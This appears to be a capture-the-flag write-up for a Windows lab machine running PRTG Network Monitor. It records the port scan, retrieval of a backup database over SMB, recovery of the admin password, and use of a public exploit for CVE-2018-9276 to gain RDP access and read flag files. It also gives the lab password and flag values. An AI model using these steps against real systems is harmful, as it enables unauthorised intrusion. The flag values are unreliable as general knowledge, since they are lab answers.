# Monitor

**IP Address:** 172.31.1.21

## Enumeration
### Open Ports
| Port | State | Service | Version |
|------|-------|---------|---------|
| 135/tcp | open | msrpc | Microsoft Windows RPC  |
| 139/tcp | open | netbios-ssn | Microsoft Windows netbios-ssn  |
| 3389/tcp | open | ms-wbt-server | Microsoft Terminal Services  |
| 445/tcp | open | microsoft-ds | Windows Server 2016 Datacenter 14393 microsoft-ds  |
| 47001/tcp | open | http | Microsoft HTTPAPI httpd 2.0 |
| 49664/tcp | open | msrpc | Microsoft Windows RPC  |
| 49665/tcp | open | msrpc | Microsoft Windows RPC  |
| 49666/tcp | open | msrpc | Microsoft Windows RPC  |
| 49667/tcp | open | msrpc | Microsoft Windows RPC  |
| 49669/tcp | open | msrpc | Microsoft Windows RPC  |
| 49675/tcp | open | msrpc | Microsoft Windows RPC  |
| 49677/tcp | open | msrpc | Microsoft Windows RPC  |
| 5985/tcp | open | http | Microsoft HTTPAPI httpd 2.0 |
| 80/tcp | open | http | Indy httpd 18.1.38.11958 |
| 137/udp | open | netbios-ns | Microsoft Windows netbios-ns  |
| 138/udp | open|filtered | netbios-dgm |   |
| 4500/udp | open|filtered | nat-t-ike |   |
| 500/udp | open|filtered | isakmp |   |

## Exploitation 
### Exploit Details (SearchSploit)
* **Name** - PRTG Network Monitor 18.2.38 - (Authenticated) Remote Code Execution 
* **CVE** - 2018-9276
* **Module** - windows/webapps/46527.sh
* **Disclosed** - 2019-03-11
* **References**
  * https://www.exploit-db.com/exploits/46527
  * https://nvd.nist.gov/vuln/detail/CVE-2018-9276

1. Locate the dev06.zip file located on the WebBackups share. Download the file and unzip it. 

Commands
```
smbclient //$ip/WebBackups
get dev06.zip
quit
unzip dev06.zip
```

![Execute Exploit](images/exploit1.png)

2. Open the database file with sqlitebrowser, select the app_mainuser table. Then copy the password. 

![Execute Exploit](images/exploit2.png)

3. Navigate to the PRTG website http://172.31.1.21/index.htm and login with the default admin user (prtgadmin) & the password that was found in the database (Se7vmMqP0al)

![Execute Exploit](images/exploit3.png)

4. In the browser bring up the inspector, navigate to storage and copy the 3 values found there. 

![Execute Exploit](images/exploit4.png)

5. Execute the exploit by replacing the values as shown. 

Commands
```
./46527.sh -u http://$ip -c "_ga=GA1.1.350937078.1628391685; _gid=GA1.1.521583562.1628691894; OCTOPUS1813811958=ezAxQjJCRkNDLUNDRDItNEFCNC05RDkwLTdFQUMxNEUxM0JBQ30%3D; _gat=1"
Se7vmMqP0al
```

![Execute Exploit](images/exploit5.png)

6. Login using remote desktop. Run and administrator command prompt and read the access.txt & system.txt files. 

Commands
```
remmina -c rdp://pentest@$ip
type C:\Users\Hannah\Desktop\access.txt
type C:\Users\Administrator\Desktop\system.txt
```

![Execute Exploit](images/exploit6.png)

![Execute Exploit](images/exploit7.png)


## Loot
```
access.txt
1a69b557236ac8373ded3f1dc25e0d8c
system.txt
1a69b557236ac8373ded3f1dc25e0d8c
```